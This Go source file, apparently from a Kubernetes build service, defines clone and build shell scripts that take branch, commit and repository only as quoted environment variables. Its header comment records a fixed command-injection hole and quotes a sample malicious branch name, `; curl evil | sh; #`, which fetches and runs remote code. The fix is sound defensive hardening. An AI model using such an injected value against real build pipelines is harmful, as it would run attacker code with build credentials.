package services

import (
	corev1 "k8s.io/api/core/v1"

	"kubernetes.getvesta.sh/api/internal/git"
)

// Build scripts, and why nothing user-supplied appears in them.
//
// The nixpacks and buildpacks strategies run a shell script, and that script used to be
// assembled with fmt.Sprintf from the branch, the commit SHA, the repository and the image
// destination. Branch and commit arrive from the webhook payload, and that endpoint is
// unauthenticated -- so a branch named `; curl evil | sh; #` ran in the build pod with the
// build's credentials mounted.
//
// Every one of those values is now an environment variable, referenced quoted, so the shell
// treats them as data whatever they contain. The scripts below are constants: they
// interpolate nothing, which is a property a test can check rather than a claim.
//
// The token is handled separately again. It used to be expanded into the clone URL, which
// put a live git credential into the container's argv -- visible to anything that can read
// /proc inside the pod, and to any git error that echoes the remote. It now goes to a
// credentials file passed to one git invocation, so it appears in neither.

// cloneScript leaves a checkout in /workspace with the working directory there.
//
// credential.helper is set per-invocation with -c rather than through `git config --global`,
// which would need $HOME to be set and writable; the build images disagree about what $HOME
// is, and one of them does not set it at all.
const cloneScript = `set -eu

CRED_FILE=/tmp/.vesta-git-credentials
GIT_C=""

if [ -n "${GIT_TOKEN:-}" ]; then
  umask 077
  printf 'https://%s:%s@%s\n' "${GIT_USERNAME:-$GIT_FALLBACK_USER}" "${GIT_TOKEN}" "${GIT_HOST}" > "$CRED_FILE"
  GIT_C="credential.helper=store --file=$CRED_FILE"
fi

CLONE_URL="https://${GIT_HOST}/${GIT_REPO}.git"

if [ -n "${GIT_COMMIT:-}" ]; then
  if [ -n "$GIT_C" ]; then git -c "$GIT_C" clone "$CLONE_URL" /workspace; else git clone "$CLONE_URL" /workspace; fi
  cd /workspace
  git checkout "$GIT_COMMIT"
else
  if [ -n "$GIT_C" ]; then git -c "$GIT_C" clone --depth=1 -b "$GIT_BRANCH" "$CLONE_URL" /workspace; else git clone --depth=1 -b "$GIT_BRANCH" "$CLONE_URL" /workspace; fi
  cd /workspace
fi

rm -f "$CRED_FILE"
`

// nixpacksScript clones and writes a Dockerfile. It does not build.
//
// nixpacks itself shells out to `docker build`, and a pod has no daemon to shell out to, so
// building here was never going to work. What it can do is generate: --out writes the
// Dockerfile it would have built, and kaniko builds that in the container after this one.
//
// The old script called `crane push "$IMAGE_DEST" "$IMAGE_DEST"`, which is not a thing
// either -- crane push takes a tarball and a destination, not an image pushed to itself.
const nixpacksScript = cloneScript + `
nixpacks build . --out /workspace
test -f /workspace/.nixpacks/Dockerfile || {
  echo "nixpacks produced no Dockerfile; it could not detect how to build this repository" >&2
  exit 1
}
echo "Dockerfile generated"
`

// buildpacksScript builds and pushes with the CNB lifecycle.
const buildpacksScript = cloneScript + `
/cnb/lifecycle/creator -app=/workspace -run-image=gcr.io/buildpacks/gcp/run:v1 "$IMAGE_DEST"
echo "Build and push complete"
`

// scriptEnvNames is every variable the scripts read that buildScriptEnv must supply.
// GIT_TOKEN and GIT_USERNAME are deliberately absent: they come from the git secret as
// secretKeyRef entries and must never be materialised as literal values.
var scriptEnvNames = []string{"GIT_HOST", "GIT_REPO", "GIT_BRANCH", "GIT_COMMIT", "IMAGE_DEST", "GIT_FALLBACK_USER"}

// buildScriptEnv is the script's entire input surface.
func buildScriptEnv(req BuildRequest) []corev1.EnvVar {
	host := req.Host
	if host == "" {
		host = "github.com"
	}
	provider := req.Provider
	if provider == "" {
		provider = git.ProviderGitHub
	}

	return []corev1.EnvVar{
		{Name: "GIT_HOST", Value: host},
		// Used only when the user supplied a token secret that carries no username of its
		// own. GitHub, GitLab and Bitbucket each expect a different one.
		{Name: "GIT_FALLBACK_USER", Value: git.DefaultCloneUsername(provider)},
		{Name: "GIT_REPO", Value: req.Repository},
		{Name: "GIT_BRANCH", Value: req.Branch},
		{Name: "GIT_COMMIT", Value: req.CommitSHA},
		{Name: "IMAGE_DEST", Value: req.ImageDest},
	}
}
